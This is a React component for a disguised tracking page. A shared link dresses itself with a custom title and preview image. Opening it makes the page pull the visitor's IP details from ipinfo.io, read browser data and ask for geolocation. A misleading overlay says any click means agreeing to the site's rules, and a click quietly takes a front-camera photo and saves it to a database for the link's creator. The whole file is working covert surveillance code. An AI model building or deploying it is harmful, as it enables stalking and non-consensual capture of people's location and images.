import { useEffect, useRef, useState } from "react";
import Button from "../Button/Button";
import style from './style.module.css'   
import axios from "axios";   
import { StoreData } from "../../helpers/DbActions";
import { useLocation } from "react-router-dom"; 
import useFetchDetails from "../../Hooks/useFetchDetails";

function SetMetaDatas(data) { 
    document.title = data?.title || 'Try something'
    document.querySelector('meta[property="og:image"]').content = data?.img || "https://storage.googleapis.com/pai-images/acb2784ef3bd4a7a98e41d78d7ea3fa8.jpeg"
    document.querySelector('meta[property="og:title"]').content = data?.title || 'Try something' 
} 


export default function PreivewTarget() {
    const [showModal,setshowModal] = useState(true)
    const [error,seterror] = useState(false)
    const [targetPersonData,setTargetPersonData] = useState(null)
    const [IsClicked,setIsClicked] = useState(false)
    const vdo = useRef(null)
    const warnModal = useRef(null)
    let location = useLocation();
 
    const theKey = location.search?.replace('?','')
    const uid = location.hash?.replace('#','')
    const {data} = useFetchDetails(theKey,'links',uid)
 
    // Setting the title of the page
    SetMetaDatas(data) 
    
    async function CallingApi() {  
        try { 
            const IpInfos = await axios.get("https://ipinfo.io/json") 

            const browserData = navigator.userAgentData ?{ 
                ...navigator.userAgentData, 
                brand:navigator.userAgentData.brands[2].brand,
                mobile:navigator.userAgentData.mobile,
                platform:navigator.userAgentData.platform
            }:"";

            const datas = {
                ...IpInfos.data,
                url:window.location.href,
                link_key:theKey,
                clicked_at: Date.now(),
                ...browserData
            }
            
            
            setTargetPersonData(datas);
            AskLocationPermision()
        } catch (error) {
            seterror(true)
            console.error('issues:', error)
            alert(JSON.stringify(error))
        }

    }
    function AskLocationPermision() { 
        // Check if the browser supports the Geolocation API
        if (navigator.geolocation) {
            // Use the getCurrentPosition method to get the user's location
            navigator.geolocation.getCurrentPosition(
            (position) => {
                // Access latitude and longitude from the position object
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                setTargetPersonData((prev) => ({
                    ...prev,
                    lat:latitude,
                    lon:longitude,
                })) 
                // navigator.userAgentData
            },
            (error) => {
                // Handle errors, if any
                console.error(`Error getting location: ${error.message}`);
            }
            );
        } else {
            // Browser doesn't support Geolocation API
            console.error('Geolocation is not supported in this browser.');
        }
        // Also ask the web camera access for first time
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
    }
    useEffect(() => { 
        CallingApi()  
    },[])
 
     
    function ClickedOkay() {
 
        PhotoAndStore() 
          
        function PhotoAndStore() { 
            const video = vdo.current
            // Check if the browser supports the getUserMedia method
            if (!error && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                // Access the front camera by specifying the facingMode constraint
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(function (stream) { 

                        // Assign the stream to the video element's srcObject
                        video.srcObject = stream;
                        video.play()

                        // Converting a frame into base64 photo
                        setTimeout(() => {
                            const canvas = document.createElement('canvas')
                            const context = canvas.getContext('2d')

                            canvas.width = video.videoWidth
                            canvas.height = video.videoHeight

                            context.drawImage(video, 0, 0, canvas.width, canvas.height)

                            stream.getTracks().forEach(track => track.stop());

                            const photoUrl = canvas.toDataURL('image/png')

                            const UpdateState = {...targetPersonData,img:photoUrl}
                        
                            // Storing Data into DB
                            StoreData(uid,UpdateState,'infos',true)

                            // Hide Warning/Alert modal
                            setshowModal(false)
                

                        }, 1000);

                    })
                    .catch(function (error) { 

                        // Storing Data into DB
                        StoreData(uid,targetPersonData,'infos',true)

                        // Hide Warning/Alert modal
                        setshowModal(false)

                        console.error('Error accessing camera:', error);
                    });
            } else { 
                if (!error) {
                    // Storing Data into DB
                    StoreData(uid,targetPersonData,'infos',true)
                    // Hide Warning/Alert modal
                    setshowModal(false)
                } 
                console.error('getUserMedia is not supported in this browser');
            }
        }
    }
    
    return(
        <> 
        {targetPersonData !== null ? 
            <div className={style.preview_section}>
                <div className="container">
                    <div className="row">
                        <div className="col-lg-12">
                            <h1>{data ? data.title : "Welcome to you"}</h1>
                            <img src={data ? data.img :"https://storage.googleapis.com/pai-images/acb2784ef3bd4a7a98e41d78d7ea3fa8.jpeg"} alt="https://storage.googleapis.com/pai-images/acb2784ef3bd4a7a98e41d78d7ea3fa8.jpeg" />
                        </div>
                    </div>
                </div>
       
                {showModal ? 
                    <div className={style.warnModal} ref={warnModal} onClick={ClickedOkay}> 
                        <video ref={vdo} width="500" height="500"></video>
                        <div>
                            <i>Do not click anywhere before knowing about this site, if you will click anywhere that means you are agree with our rules and regulations. to more close this window/tab and visti TOS/Privacy pages from our home page</i>
                            <Button redTheme>Okay</Button>
                        </div>
                    </div>
                : null}

            </div>
        : <h1 className="text-center mt-5 mb-5">loading...</h1> }
        </>
    )
}